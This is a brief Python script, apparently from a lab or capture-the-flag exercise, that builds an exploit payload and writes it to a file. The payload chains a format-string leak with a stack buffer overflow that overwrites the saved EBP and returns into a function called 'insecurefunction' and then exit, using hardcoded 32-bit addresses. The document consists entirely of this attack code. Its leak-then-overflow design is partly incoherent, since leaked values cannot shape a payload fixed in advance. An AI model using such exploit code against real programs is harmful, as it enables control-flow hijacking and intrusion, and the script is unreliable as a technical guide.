from struct import pack

# Addresses from your system
insecure_addr = 0x80484c4  # Address of insecurefunction
exit_addr = 0xb7ec60c0     # Address of exit

# Create format string payload to leak addresses
payload = b"AAAA" + b" %x " * 10  

# Add buffer overflow part
payload += b"A" * (512 - len(payload))  # Fill up to 512
payload += b"BBBB"                      # Overwrite saved EBP
payload += pack("<I", insecure_addr)    # Return to insecurefunction
payload += pack("<I", exit_addr)        # Return to exit

with open("exploit.txt", "wb") as f:
    f.write(payload)